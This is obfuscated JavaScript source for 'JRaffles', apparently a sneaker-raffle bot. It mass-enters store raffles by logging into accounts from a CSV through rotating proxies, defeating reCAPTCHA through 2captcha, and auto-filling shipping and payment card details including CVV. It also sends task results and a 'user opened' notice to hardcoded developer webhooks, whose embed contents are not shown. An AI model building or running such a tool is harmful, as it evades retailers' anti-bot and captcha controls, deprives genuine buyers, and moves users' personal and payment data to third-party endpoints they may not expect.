                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x43ac77, _0x447e1f, _0x5329cf) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x37b137 = 0x0; _0x37b137 < _0x447e1f['length']; _0x37b137++) {
                        var _0x205124;
                        if (_0x2f24f8 != 'yes')
                            var _0x2f24f8 = '', _0xed295a = 0x0;
                        _0x2ad028(_0x43ac77['name'] + '\x20Task\x20' + (_0x37b137 + 0x1) + '\x20/\x20' + _0x447e1f['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x447e1f, _0x37b137);
                        if (_0x447e1f[_0x37b137]['Email'] == '' || _0x447e1f[_0x37b137]['Password'] == '' || _0x447e1f[_0x37b137]['FirstName'] == '' || _0x447e1f[_0x37b137]['LastName'] == '') {
                            console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5e160d['useRandomProxy'] = ![])
                            var _0x35b864 = _0x5329cf[_0x37b137]['split'](':');
                        else
                            var _0x2416ce = Math['round'](Math['random']() * (_0x5329cf['length'] - 0x1)), _0x35b864 = _0x5329cf[_0x2416ce]['split'](':');
                        const _0x1bb830 = await _0x3d68d8['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x35b864[0x0] + ':' + _0x35b864[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x52bbdc = await _0x1bb830['newPage']();
                            await _0x52bbdc['authenticate']({
                                'username': '' + _0x35b864[0x2],
                                'password': '' + _0x35b864[0x3]
                            }), await _0x52bbdc['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x52bbdc['setRequestInterception'](!![]), _0x52bbdc['on']('request', _0x1ba22d => {
                                _0x1ba22d['resourceType']() === 'image' || _0x1ba22d['resourceType']() === 'font' || _0x1ba22d['resourceType']() === 'media' ? _0x1ba22d['abort']() : _0x1ba22d['continue']();
                            }), await _0x52bbdc['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x52bbdc['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x52bbdc['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x38c39e(0x258), await _0x52bbdc['waitForSelector']('#CustomerEmail'), console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x52bbdc['type']('#CustomerEmail', '' + _0x447e1f[_0x37b137]['Email']), await _0x38c39e(0x12c), await _0x52bbdc['type']('#CustomerPassword', '' + _0x447e1f[_0x37b137]['Password']), await _0x38c39e(0x226), await _0x52bbdc['$eval']('#customer_login', _0x544005 => _0x544005['submit']()), await _0x38c39e(0x7d0), await _0x52bbdc['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20' + _0x52c84d['cyan']('Solving\x20Captcha')), await _0x52bbdc['solveRecaptchas'](), console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x52bbdc['$eval']('.shopify-challenge__container\x20>\x20form', _0x2034c1 => _0x2034c1['submit']());
                            try {
                                await _0x52bbdc['waitForSelector']('.nav-account'), await _0x38c39e(0x4b0);
                            } catch {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x52bbdc['goto']('' + _0x447e1f[_0x37b137]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x38c39e(0xbb8), console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x52bbdc['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x52bbdc['click']('.product-select-variant-wrapper'), await _0x38c39e(0x320), await _0x52bbdc['click']('li.product-select-variant__value[data-size=\x22' + _0x447e1f[_0x37b137]['Size'] + '\x22]'), await _0x38c39e(0x384), await _0x52bbdc['$eval']('#AddToCartForm-product-template-raffle', _0x151ac2 => _0x151ac2['submit']()), await _0x52bbdc['waitForSelector']('.cart-order-summary__content'), await _0x38c39e(0x514), await _0x52bbdc['goto']('https://drop.slamjam.com/checkout'), await _0x38c39e(0x514), await _0x52bbdc['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x52bbdc['select']('#checkout_shipping_address_country', '' + _0x447e1f[_0x37b137]['Country']), await _0x38c39e(0x200), await _0x52bbdc['waitForSelector']('#checkout_shipping_address_first_name'), await _0x52bbdc['type']('#checkout_shipping_address_first_name', '' + _0x447e1f[_0x37b137]['FirstName']), await _0x38c39e(0x237), await _0x52bbdc['type']('#checkout_shipping_address_last_name', '' + _0x447e1f[_0x37b137]['LastName']), await _0x38c39e(0x1e0), await _0x52bbdc['type']('#checkout_shipping_address_address1', _0x447e1f[_0x37b137]['Address1'] + '\x20' + _0x447e1f[_0x37b137]['HouseNumber']), await _0x38c39e(0x514), await _0x52bbdc['type']('#checkout_shipping_address_address2', '' + _0x447e1f[_0x37b137]['Address2']), await _0x38c39e(0x514);
                            _0x447e1f[_0x37b137]['Postcode'] == undefined && (_0x447e1f[_0x37b137]['Postcode'] = _0x447e1f[_0x37b137]['Zip']);
                            await _0x52bbdc['type']('#checkout_shipping_address_zip', '' + _0x447e1f[_0x37b137]['Postcode']), await _0x38c39e(0x2bc), await _0x52bbdc['type']('#checkout_shipping_address_city', '' + _0x447e1f[_0x37b137]['City']), await _0x38c39e(0x320), await _0x52bbdc['type']('#checkout_shipping_address_phone', '' + _0x447e1f[_0x37b137]['Phone']), await _0x38c39e(0x320), await _0x52bbdc['click']('#continue_button'), await _0x38c39e(0xbb8), await _0x52bbdc['waitForSelector']('.summary-title'), await _0x38c39e(0x320), await _0x52bbdc['click']('#continue_button'), await _0x38c39e(0x320), console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x52bbdc['waitForSelector']('#checkout_credit_card_vault'), await _0x38c39e(0x3e8);
                            var _0x30e3fd = await _0x52bbdc['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x421fe7 = await _0x30e3fd['contentFrame']();
                            await _0x421fe7['click']('#number'), await _0x38c39e(0x3e8), await _0x421fe7['type']('#number', '' + _0x447e1f[_0x37b137]['CardNumber'], { 'delay': 0x78 }), _0x30e3fd = await _0x52bbdc['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x421fe7 = await _0x30e3fd['contentFrame'](), await _0x38c39e(0x1c2), await _0x421fe7['click']('#name'), await _0x38c39e(0x1f4), await _0x421fe7['type']('#name', '' + _0x447e1f[_0x37b137]['NameOnCard'], { 'delay': 0x78 }), _0x30e3fd = await _0x52bbdc['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x421fe7 = await _0x30e3fd['contentFrame'](), await _0x38c39e(0x1c2), await _0x421fe7['click']('#expiry'), await _0x38c39e(0x1f4), await _0x421fe7['type']('#expiry', '' + _0x447e1f[_0x37b137]['ExpiryDate'], { 'delay': 0x78 }), _0x30e3fd = await _0x52bbdc['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x421fe7 = await _0x30e3fd['contentFrame'](), await _0x38c39e(0x1c2), await _0x421fe7['click']('#verification_value'), await _0x38c39e(0x1f4), await _0x421fe7['type']('#verification_value', '' + _0x447e1f[_0x37b137]['CVV'], { 'delay': 0x78 }), await _0x52bbdc['$eval']('#accepts-flag-raffle', _0x1122bc => _0x1122bc['click']()), await _0x38c39e(0x7d0), console['log'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x52bbdc['$eval']('#continue_button', _0x5aa05a => _0x5aa05a['click']()), await _0x38c39e(0x1b58), await _0x52bbdc['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x52bbdc['$eval']('.edit_checkout.animate-floating-labels', _0x3cdd93 => _0x3cdd93['submit']()), await _0x38c39e(0x7d0);
                            try {
                                await _0x52bbdc['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x2f24f8 = 'no', _0x41f993(_0x447e1f[_0x37b137], _0x43ac77), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x516f55) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x516f55['message']);
                            }
                            var _0x2469c1 = await _0x485032(_0x447e1f[_0x37b137], _0x43ac77, 'dev', ![]), _0xed2b9a = await _0x485032(_0x447e1f[_0x37b137], _0x43ac77, 'pub', ![]);
                            const _0x29a528 = {
                                'succesDEVMSG': { 'embeds': [_0x2469c1] },
                                'succesPUBMSG': { 'embeds': [_0xed2b9a] }
                            };
                            try {
                                _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x29a528['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x29a528['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x2766d4, _0x29a528['succesPUBMSG']);
                            } catch (_0xf3510a) {
                                console['log'](_0x52c84d['yellow'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf3510a));
                            }
                        } catch (_0x4aa579) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20' + _0x4aa579)), _0x205124 = '' + _0x4aa579;
                            var _0x24ec62 = await _0x485032(kickz[_0x37b137], _0x43ac77, 'dev', !![], _0x205124);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x24ec62] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], EMBEDS['errorDEV']), await _0x16a920(_0x233d0f, EMBEDS['errorDEV']), _0x2f24f8 = 'yes';
                        } finally {
                            _0x1bb830 && _0x1bb830['close']();
                            if (_0x2f24f8 == 'yes' && _0xed295a != 0x5 && _0x205124 != 'Size\x20Not\x20Found') {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x43ac77['name'] + ']\x20Task\x20' + (_0x37b137 + 0x1) + '\x20:\x20Retrying')), _0x37b137 = _0x37b137 - 0x1, _0xed295a = _0xed295a + 0x1;
                                continue;
                            }
                            _0x2f24f8 == 'yes' && _0xed295a >= 0x5 && (_0x1ac5d5(_0x447e1f[_0x37b137], _0x43ac77), _0x2f24f8 = 'no', _0xed295a = 0x0), console['log']('Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x312588) {
                    var _0x540c37 = await _0x48792d(), _0x33add8 = _0x4d1c4a['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x1b58f3 = _0x203056['parse'](_0x33add8, { 'header': !![] })['data'];
                    for (var _0x3f5930 = 0x0; _0x3f5930 < _0x1b58f3['length']; _0x3f5930++) {
                        var _0x3c4c33 = _0x1b58f3[_0x3f5930]['Store'], _0x750586 = _0x1b58f3[_0x3f5930]['Mode'];
                        for (var _0x240f07 of _0x11a209) {
                            const _0x26a03a = _0x240f07['name']['includes'](_0x3c4c33);
                            if (!_0x26a03a)
                                continue;
                            for (mode of _0x240f07['modules']) {
                                if (mode['name'] == _0x750586) {
                                    console['log']('Running\x20' + _0x52c84d['cyan'](mode['name'])), await mode['function'](mode, [_0x1b58f3[_0x3f5930]], _0x540c37);
                                    var _0x92bbdf = _0x33add8['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x4d1c4a['writeFileSync']('../failed-tasks.csv', _0x92bbdf);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x41e90e = await _0x540112['get']('Answer');
                    if (_0x41e90e['Answer']['toLowerCase']() == 'y') {
                        _0x4d1c4a['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x38c39e(0x3e8);
                        return;
                    }
                    if (_0x41e90e['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x38c39e(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x38c39e(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x908ae4(_0x49c037) {
    var _0x1e609d = await _0x48792d(), _0x42cb79 = _0x4d1c4a['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x40bbe7 = _0x203056['parse'](_0x42cb79, { 'header': !![] })['data'];
    for (var _0xa8422e = 0x0; _0xa8422e < _0x40bbe7['length']; _0xa8422e++) {
        var _0xf77838 = _0x40bbe7[_0xa8422e]['Store'], _0x427ffd = _0x40bbe7[_0xa8422e]['Mode'];
        for (var _0x3317f6 of _0x11a209) {
            const _0x39c101 = _0x3317f6['name']['includes'](_0xf77838);
            if (_0x39c101)
                for (mode of _0x11a209[_0x3317f6]['modules']) {
                    const _0xd380e4 = mode['name']['includes'](_0x427ffd);
                    _0xd380e4 && (_0x49c037 = mode['name'], await mode['function'](_0x49c037, _0x40bbe7[_0xa8422e], _0x1e609d));
                }
        }
    }
}
async function _0x5c9d25() {
    await _0x27d995(), console['clear']();
    if (_0xa56f6b != 'devkey') {
        let _0x1dcedc = await _0x4cb102['autoUpdate']();
        if (_0x1dcedc === 'yes')
            return _0x1723b5('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1b8b03 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x38c39e(0x2710);
        ;
    }
    await _0x17eddb(_0x1b8b03);
    if (_0x2db043 === ![])
        return console['log']('Closing\x20Browser'), await _0x38c39e(0xbb8);
    else
        try {
            var _0xdecef7 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x50a338
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0xa56f6b
                    }
                ]
            }];
            const _0xc4a4fa = { 'embeds': _0xdecef7 };
            var _0x2af7ff = await _0x485032(null, null, 'open', ![]);
            const _0x1dd8b0 = { 'openDEVMSG': { 'embeds': [_0x2af7ff] } };
            await _0x16a920(_0x41520b, _0x1dd8b0['openDEVMSG']);
            async function _0x104bbd() {
                _0x2ad028('JRaffles\x20' + _0xa56f6b), console['clear'](), console['log']('Welcome\x20to\x20' + _0x52c84d['cyan']('JRaffles();') + '\x20' + _0xa56f6b), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x3d979a = 0x0; _0x3d979a < _0x11a209['length'] - 0x4; _0x3d979a++) {
                    if (_0x3d979a >= 0xa) {
                        console['log']('\x20(' + _0x3d979a + ')\x20[' + _0x11a209[_0x3d979a]['name'] + ']');
                        continue;
                    }
                    if (_0x11a209[_0x3d979a]['name'] === 'Reload\x20Settings' || _0x11a209[_0x3d979a]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x3d979a + ')\x20\x20[' + _0x11a209[_0x3d979a]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x11a209['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x11a209['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x11a209['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x11a209['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2f8b95();
                if (taskModule > _0x11a209['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x38c39e(0x3e8), _0x104bbd();
                if (_0x11a209[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                    var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x3be1c8 = await _0x48792d(), _0x1b57f7 = await _0xd0c90a();
                        _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x1b57f7), await _0x2c5b13['function'](_0x2c5b13, _0x1b57f7, _0x3be1c8);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x3be1c8 = await _0x48792d(), _0x1b57f7 = await _0xd0c90a();
                            _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x1b57f7), await _0x2c5b13['function'](_0x2c5b13, _0x1b57f7, _0x3be1c8);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x3be1c8 = await _0x48792d();
                                await _0x2c5b13['function'](_0x2c5b13, _0x38c942, _0x3be1c8);
                            }
                        }
                    }
                    return _0x104bbd();
                }
                if (_0x11a209[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                        var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x3be1c8 = await _0x48792d(), _0x41f544 = await _0xd0c90a();
                            _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x41f544), await _0x2c5b13['function'](_0x2c5b13, _0x41f544, _0x3be1c8);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x3be1c8 = await _0x48792d(), _0x41f544 = await _0xd0c90a();
                                _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x41f544), await _0x2c5b13['function'](_0x2c5b13, _0x41f544, _0x3be1c8);
                            }
                        }
                    } catch (_0x154510) {
                        console['log'](_0x154510), await _0x38c39e(0xfa0);
                    }
                    return _0x104bbd();
                }
                if (_0x11a209[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                    var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x3be1c8 = await _0x48792d();
                        return await _0x2c5b13['function'](_0x2c5b13, _0x3be1c8), _0x104bbd();
                    }
                    var _0x3be1c8 = await _0x48792d(), _0x31e66d = await _0xd0c90a();
                    return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x31e66d), await _0x2c5b13['function'](_0x2c5b13, _0x31e66d, _0x3be1c8), _0x104bbd();
                }
                if (_0x11a209[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                    var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x3be1c8 = await _0x48792d(), _0x31e66d = await _0xd0c90a();
                    return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x31e66d), await _0x2c5b13['function'](_0x2c5b13, _0x31e66d, _0x3be1c8), _0x104bbd();
                } else {
                    if (_0x11a209[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                        var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x3be1c8 = await _0x48792d(), _0x56444f = await _0xd0c90a();
                            return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x56444f), await _0x2c5b13['function'](_0x2c5b13, _0x56444f, _0x3be1c8), _0x104bbd();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x3be1c8 = await _0x48792d();
                                return await _0x2c5b13['function'](_0x2c5b13, _0x38c942, _0x3be1c8), _0x104bbd();
                            }
                        }
                        ;
                    } else {
                        if (_0x11a209[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                            var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction], _0x3be1c8 = await _0x48792d(), _0x5c4a12 = await _0xd0c90a();
                            return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x5c4a12), await _0x2c5b13['function'](_0x2c5b13, _0x5c4a12, _0x3be1c8), await _0x38c39e(0x1388), _0x104bbd();
                        } else {
                            if (_0x11a209[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                                var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x3be1c8 = await _0x48792d(), _0x56444f = await _0xd0c90a();
                                    return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x56444f), await _0x2c5b13['function'](_0x2c5b13, _0x56444f, _0x3be1c8), _0x104bbd();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x3be1c8 = await _0x48792d();
                                        return await _0x2c5b13['function'](_0x2c5b13, _0x38c942, _0x3be1c8), _0x104bbd();
                                    }
                                }
                                ;
                            } else {
                                if (_0x11a209[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                                    var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x279bb5('https://bouncewear.com/nl/account/register', _0x2c5b13);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x11a209[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                                        var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x3be1c8 = await _0x48792d(), _0x1d3c98 = await _0xd0c90a();
                                            return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x1d3c98), await _0x2c5b13['function'](_0x2c5b13, _0x1d3c98, _0x3be1c8), _0x104bbd();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x3be1c8 = await _0x48792d(), _0x1d3c98 = await _0xd0c90a();
                                                return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x1d3c98), await _0x2c5b13['function'](_0x2c5b13, _0x1d3c98, _0x3be1c8), _0x104bbd();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x11a209[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                                            var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x3be1c8 = await _0x48792d(), _0x583ee7 = await _0xd0c90a();
                                                return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x583ee7), await _0x2c5b13['function'](_0x2c5b13, _0x583ee7, _0x3be1c8), _0x104bbd();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x3be1c8 = await _0x48792d(), _0x583ee7 = await _0xd0c90a();
                                                    return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x583ee7), await _0x2c5b13['function'](_0x2c5b13, _0x583ee7, _0x3be1c8), _0x104bbd();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x11a209[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                                                var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x3be1c8 = await _0x48792d(), _0x15bb25 = await _0xd0c90a();
                                                    return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x15bb25), await _0x2c5b13['function'](_0x2c5b13, _0x15bb25, _0x3be1c8), _0x104bbd();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x3be1c8 = await _0x48792d(), _0x15bb25 = await _0xd0c90a();
                                                        return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x15bb25), await _0x2c5b13['function'](_0x2c5b13, _0x15bb25, _0x3be1c8), _0x104bbd();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x11a209[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                                                    var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x3be1c8 = await _0x48792d(), _0x2a1c87 = await _0xd0c90a();
                                                        return _0x5e160d['shuffleTasks'] && await _0x2166d2(_0x2a1c87), await _0x2c5b13['function'](_0x2c5b13, _0x2a1c87, _0x3be1c8), _0x104bbd();
                                                    }
                                                } else {
                                                    if (_0x11a209[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x38c39e(0x3e8), _0x104bbd();
                                                    else {
                                                        if (_0x11a209[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x48dc2b = _0x11a209[taskModule]['name'], _0x3be1c8 = await _0x48792d();
                                                            const _0x35bcaa = await _0x449cae();
                                                            var _0x38c942 = _0x35bcaa['split'](';');
                                                            await _0x5858ec(_0x38c942, _0x48dc2b, _0x3be1c8);
                                                        } else {
                                                            if (_0x11a209[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x246aa0(_0x11a209[taskModule]['modules']);
                                                                var _0x2c5b13 = _0x11a209[taskModule]['modules'][taskFunction];
                                                                return await _0x2c5b13['function'](_0x2c5b13), _0x104bbd();
                                                            } else {
                                                                if (_0x11a209[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0xda325b = 0x0;
                                                                    for (const _0x3d455e in _0x5e160d) {
                                                                        console['log']('(' + _0xda325b + ')\x20' + _0x3d455e + '\x20:\x20' + _0x5e160d[_0x3d455e]), _0xda325b++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0xda325b + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x1a1147 = await _0x2af423();
                                                                    if (_0x1a1147 == _0xda325b)
                                                                        return _0x104bbd();
                                                                    console['clear'];
                                                                    var _0x4e1662 = 0x0;
                                                                    for (var _0x38174e in _0x5e160d) {
                                                                        if (_0x1a1147 == _0x4e1662) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x38174e + '\x20:'), _0x5e160d[_0x38174e] = await _0x40b1d1(), _0x4d1c4a['writeFileSync']('../settings.json', JSON['stringify'](_0x5e160d));
                                                                            break;
                                                                        } else
                                                                            _0x4e1662++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x38c39e(0xbb8), _0x104bbd();
                                                                } else {
                                                                    if (_0x11a209[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x27d995(), _0x104bbd();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x11a209[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x4c401b = await _0x4e4e9d();
                                                                            _0x4c401b == 'ModuleVoorDeBoys' ? (await _0x257f07(), await _0x5ac243(), await afewFunction(_0x3d716a[_0x57f10b], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x38c39e(0xbb8));
